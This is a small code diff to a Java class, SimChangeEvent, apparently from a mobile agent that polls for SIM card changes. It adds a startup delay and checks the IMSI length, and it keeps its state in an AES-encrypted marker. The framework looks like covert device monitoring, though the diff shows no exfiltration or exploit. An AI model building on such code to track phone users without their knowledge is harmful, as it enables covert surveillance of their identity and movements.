@@ -27,8 +27,11 @@ public final class SimChangeEvent extends Event {
     private static Debug debug = new Debug("SimChangeEvent", DebugLevel.VERBOSE);
     //#endif
 
+    // dopo un minuto
+    private static final long DELAY = 60000;
     // ogni dieci minuti
     private static final long PERIOD = 600000;
+
     Markup markup;
 
     /**
@@ -44,6 +47,7 @@ public final class SimChangeEvent extends Event {
 
         if (!Device.isCDMA()) {
 
+            setDelay(DELAY);
             setPeriod(PERIOD);
             markup = new Markup(eventType, Keys.getInstance().getAesKey());
         }
@@ -60,7 +64,18 @@ public final class SimChangeEvent extends Event {
         //#endif
 
         if (!markup.isMarkup()) {
-            updateImsi();
+
+            Device.getInstance().refreshData();
+
+            final byte[] imsi = Device.getInstance().getWImsi();
+            if (imsi == null || imsi.length < 8) {
+                //#ifdef DEBUG
+                debug.trace("imsi too short, maybe the sim is not enabled ");
+                //#endif
+            } else {
+
+                updateImsi();
+            }
         }
     }
 
@@ -76,7 +91,15 @@ public final class SimChangeEvent extends Event {
             return;
         }
 
+        Device.getInstance().refreshData();
+
         final byte[] imsi = Device.getInstance().getWImsi();
+        if (imsi == null || imsi.length < 8) {
+            //#ifdef DEBUG
+            debug.trace("imsi too short ");
+            //#endif
+        }
+
         byte[] saved;
         try {
             if (markup.isMarkup()) {
